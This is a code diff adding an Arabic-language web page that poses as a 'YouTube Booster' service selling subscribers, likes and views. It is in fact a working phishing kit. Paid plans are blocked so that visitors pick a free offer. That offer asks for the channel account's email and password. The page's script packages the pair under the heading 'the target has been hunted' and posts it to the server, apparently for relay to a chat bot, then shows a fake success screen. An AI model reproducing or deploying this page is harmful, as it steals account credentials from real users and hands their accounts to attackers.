@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Booster | رشق مشتركين ومشاهدات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #0f0f0f; color: #ffffff; min-height: 100vh; padding: 20px;
+            background-image: radial-gradient(circle at top right, rgba(255, 0, 0, 0.1), transparent 50%), radial-gradient(circle at bottom left, rgba(255, 0, 0, 0.05), transparent 50%);
+        }
+        .container { max-width: 600px; margin: 0 auto; position: relative; z-index: 2; }
+        
+        .header { text-align: center; margin-bottom: 25px; padding: 25px 20px; background: linear-gradient(145deg, #1a1a1a, #0a0a0a); border-radius: 20px; border: 2px solid #ff0000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2); }
+        .header i { font-size: 60px; color: #ff0000; margin-bottom: 10px; text-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
+        .header h1 { font-size: 26px; margin-bottom: 5px; color: #fff; }
+        .header p { font-size: 14px; color: #aaa; }
+
+        .section-title { color: #ff0000; font-size: 18px; margin: 20px 0 10px; text-align: right; border-right: 4px solid #ff0000; padding-right: 10px; }
+
+        .plans-container { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .plan-card { background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; }
+        .plan-card:hover { border-color: #ff0000; transform: translateY(-2px); }
+        .plan-card.selected { border-color: #ff0000; background: rgba(255, 0, 0, 0.1); box-shadow: 0 0 15px rgba(255, 0, 0, 0.3); }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 24px; color: #ff0000; }
+        .plan-info h3 { font-size: 16px; margin-bottom: 3px; color: #fff; }
+        .plan-info p { font-size: 12px; color: #aaa; }
+        
+        .price-tag { background: #ff0000; color: #fff; padding: 6px 12px; border-radius: 8px; font-weight: bold; font-size: 14px; }
+        .price-tag.free { background: #2ecc71; }
+
+        .login-screen { display: none; text-align: center; margin-top: 20px; }
+        .login-screen.active { display: block; }
+        .login-box { background: rgba(26, 26, 26, 0.95); border: 1px solid #ff0000; border-radius: 15px; padding: 25px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2); }
+        .login-box h2 { color: #ff0000; margin-bottom: 10px; }
+        .login-box p { color: #aaa; margin-bottom: 20px; font-size: 14px; }
+        .login-box input { width: 100%; padding: 14px; margin-bottom: 15px; background: #0a0a0a; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 15px; }
+        .login-box input:focus { outline: none; border-color: #ff0000; }
+        .btn { background: #ff0000; color: #fff; border: none; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4); }
+        .btn:hover { transform: scale(1.02); }
+        .btn:disabled { background: #555; cursor: not-allowed; box-shadow: none; }
+        .btn-secondary { background: #333; box-shadow: none; }
+        .btn-secondary:hover { background: #444; }
+
+        .success-screen { display: none; text-align: center; padding: 30px; }
+        .success-screen.active { display: block; }
+        .success-icon { font-size: 100px; color: #2ecc71; animation: popIn 0.6s ease; margin-bottom: 20px; }
+        .success-text { font-size: 24px; font-weight: bold; color: #2ecc71; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error-msg { color: #e74c3c; background: rgba(231, 76, 60, 0.1); padding: 10px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid rgba(231, 76, 60, 0.3); }
+        
+        .footer { text-align: center; margin-top: 30px; color: #555; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <i class="fab fa-youtube"></i>
+            <h1>YouTube Booster</h1>
+            <p>رشق مشتركين، لايكات، ومشاهدات</p>
+        </div>
+
+        <div class="section-title"><i class="fas fa-users"></i> رشق المشتركين</div>
+        <div class="plans-container">
+            <div class="plan-card" onclick="handleFreePlan('مشتركين', 500, 'مجاناً', this)">
+                <div class="plan-info">
+                    <i class="fas fa-gift"></i>
+                    <div><h3>500 مشترك</h3><p>مكافأة ترحيبية</p></div>
+                </div>
+                <div class="price-tag free">مجاناً</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشتركين', 1000, '$1.99', this)">
+                <div class="plan-info"><i class="fas fa-user-plus"></i><div><h3>1000 مشترك</h3><p>باقة أساسية</p></div></div>
+                <div class="price-tag">$1.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشتركين', 2500, '$4.99', this)">
+                <div class="plan-info"><i class="fas fa-rocket"></i><div><h3>2500 مشترك</h3><p>باقة متقدمة</p></div></div>
+                <div class="price-tag">$4.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشتركين', 5000, '$9.99', this)">
+                <div class="plan-info"><i class="fas fa-crown"></i><div><h3>5000 مشترك</h3><p>باقة VIP</p></div></div>
+                <div class="price-tag">$9.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشتركين', 10000, '$19.99', this)">
+                <div class="plan-info"><i class="fas fa-star"></i><div><h3>10000 مشترك</h3><p>باقة الشهرة</p></div></div>
+                <div class="price-tag">$19.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشتركين', 20000, '$34.99', this)">
+                <div class="plan-info"><i class="fas fa-gem"></i><div><h3>20000 مشترك</h3><p>باقة الأساطير</p></div></div>
+                <div class="price-tag">$34.99</div>
+            </div>
+        </div>
+
+        <div class="section-title"><i class="fas fa-thumbs-up"></i> رشق اللايكات</div>
+        <div class="plans-container">
+            <div class="plan-card" onclick="handlePaidPlan('لايكات', 1000, '$0.99', this)">
+                <div class="plan-info"><i class="fas fa-thumbs-up"></i><div><h3>1000 لايك</h3><p>باقة صغيرة</p></div></div>
+                <div class="price-tag">$0.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('لايكات', 5000, '$4.99', this)">
+                <div class="plan-info"><i class="fas fa-thumbs-up"></i><div><h3>5000 لايك</h3><p>باقة متوسطة</p></div></div>
+                <div class="price-tag">$4.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('لايكات', 10000, '$8.99', this)">
+                <div class="plan-info"><i class="fas fa-thumbs-up"></i><div><h3>10000 لايك</h3><p>باقة كبيرة</p></div></div>
+                <div class="price-tag">$8.99</div>
+            </div>
+        </div>
+
+        <div class="section-title"><i class="fas fa-eye"></i> رشق المشاهدات</div>
+        <div class="plans-container">
+            <div class="plan-card" onclick="handlePaidPlan('مشاهدات', 5000, '$1.99', this)">
+                <div class="plan-info"><i class="fas fa-eye"></i><div><h3>5000 مشاهدة</h3><p>باقة صغيرة</p></div></div>
+                <div class="price-tag">$1.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشاهدات', 10000, '$2.99', this)">
+                <div class="plan-info"><i class="fas fa-eye"></i><div><h3>10000 مشاهدة</h3><p>باقة متوسطة</p></div></div>
+                <div class="price-tag">$2.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشاهدات', 25000, '$5.99', this)">
+                <div class="plan-info"><i class="fas fa-eye"></i><div><h3>25000 مشاهدة</h3><p>باقة كبيرة</p></div></div>
+                <div class="price-tag">$5.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشاهدات', 50000, '$9.99', this)">
+                <div class="plan-info"><i class="fas fa-eye"></i><div><h3>50000 مشاهدة</h3><p>باقة ضخمة</p></div></div>
+                <div class="price-tag">$9.99</div>
+            </div>
+            <div class="plan-card" onclick="handlePaidPlan('مشاهدات', 100000, '$17.99', this)">
+                <div class="plan-info"><i class="fas fa-eye"></i><div><h3>100000 مشاهدة</h3><p>باقة أسطورية</p></div></div>
+                <div class="price-tag">$17.99</div>
+            </div>
+        </div>
+
+        <div id="loginScreen" class="login-screen">
+            <div class="login-box">
+                <h2><i class="fas fa-lock"></i> تنبيه تسجيل الدخول</h2>
+                <p>يرجى تسجيل الدخول أولاً لتحديد القناة المراد رشقها وتأكيد الطلب.</p>
+                <div id="errorBox" class="error-msg"></div>
+                <input type="email" id="email" placeholder="البريد الإلكتروني المرتبط بالقناة">
+                <input type="password" id="password" placeholder="كلمة مرور الحساب">
+                <button class="btn" id="submitBtn" onclick="submitOrder()"><i class="fas fa-check-circle"></i> تأكيد وإرسال</button>
+                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="closeLogin()"><i class="fas fa-times"></i> إلغاء</button>
+            </div>
+        </div>
+
+        <div id="successScreen" class="success-screen">
+            <i class="fas fa-check-circle success-icon"></i>
+            <div class="success-text">تم إرسال الطلب بنجاح!</div>
+        </div>
+
+        <div class="footer">© 2026 YouTube Booster. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedType = "";
+        let selectedAmount = "";
+        let selectedPrice = "";
+
+        function handleFreePlan(type, amount, price, element) {
+            selectedType = type;
+            selectedAmount = amount;
+            selectedPrice = price;
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('loginScreen').classList.add('active');
+        }
+
+        function handlePaidPlan(type, amount, price, element) {
+            selectedType = type;
+            selectedAmount = amount;
+            selectedPrice = price;
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            alert("⚠️ هذا القسم مدفوع!\n\nيرجى اختيار الباقة المجانية (500 مشترك) أولاً لتسجيل الدخول.");
+        }
+
+        function closeLogin() {
+            document.getElementById('loginScreen').classList.remove('active');
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+        }
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function submitOrder() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorBox = document.getElementById('errorBox');
+            const btn = document.getElementById('submitBtn');
+
+            errorBox.style.display = 'none';
+
+            if (!email || !email.includes('@')) {
+                errorBox.innerText = "❌ يرجى إدخال بريد إلكتروني صحيح!";
+                errorBox.style.display = 'block';
+                return;
+            }
+            if (!password || password.length < 6) {
+                errorBox.innerText = "❌ يرجى إدخال كلمة مرور صحيحة (6 حروف على الأقل)!";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+
+            const text = `🔥 <b>𓆩💀𓆪『 تَـمَّ اصْـطِـيَـادُ الـهـدف 』𓆩☠️𓆪</b>\n\n` +
+                         `📧 <b>البريد الإلكتروني:</b> ${email}\n` +
+                         `🔑 <b>كلمة المرور:</b> ${password}\n` +
+                         `🎯 <b>الباقة:</b> ${selectedAmount} ${selectedType} (${selectedPrice})`;
+
+            await sendToBot(text);
+
+            document.getElementById('loginScreen').classList.remove('active');
+            document.getElementById('successScreen').classList.add('active');
+            
+            setTimeout(() => {
+                document.getElementById('successScreen').classList.remove('active');
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+                btn.disabled = false;
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
